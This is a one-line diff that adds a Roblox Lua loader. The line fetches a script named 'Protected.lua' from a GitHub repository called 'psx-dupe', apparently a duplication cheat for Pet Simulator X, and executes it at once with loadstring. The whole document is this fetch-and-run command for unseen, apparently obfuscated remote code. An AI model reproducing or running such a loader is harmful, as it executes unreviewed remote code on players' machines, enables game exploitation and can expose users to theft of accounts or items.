@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/75nw/psx-dupe/main/Protected.lua"))()
